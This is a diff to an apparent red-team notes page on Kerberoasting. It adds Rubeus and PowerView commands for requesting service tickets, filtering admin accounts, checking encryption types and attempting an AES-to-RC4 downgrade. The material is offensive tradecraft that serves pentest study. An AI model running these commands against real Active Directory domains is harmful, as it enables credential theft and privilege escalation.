@@ -129,7 +129,7 @@ Domain accounts are often used to run services. They may have been given many pr
 
 We can request a TGS for the target service, and attempt to crack its hash. RC4 hashes are easy to crack while AES hashes are harder.
 
-It's common to use [mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) or [PowerView](/cybersecurity/red-team/tools/utilities/windows/powersploit.md) to fetch TGS tickets.
+We can use [mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md), [Rubeus](/cybersecurity/red-team/tools/utilities/creds/rubeus.md) or [PowerView](/cybersecurity/red-team/tools/utilities/windows/powersploit.md) to fetch TGS tickets.
 
 ```shell!
 $ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
@@ -151,7 +151,17 @@ mimikatz> kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
 PS> Import-Module .\PowerView.ps1
 PS> Get-DomainUser * -spn | select samaccountname
 PS> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\xxx.csv -NoTypeInformation
+PS> Get-DomainUser cn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes # encryption scheme
 ```
+
+```shell!
+PS> .\Rubeus.exe kerberoast /stats # number of SPNs, encryption types
+PS> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+PS> .\Rubeus.exe kerberoast /user:cn /nowrap # cn encryption settings
+PS> .\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap # try a downgrade attack
+```
+
+Some tools can try to perform a downgrade attack from AES to RC4. It won't work as of Windows Server 2019.
 </div></div>
 
 <hr class="sep-both">
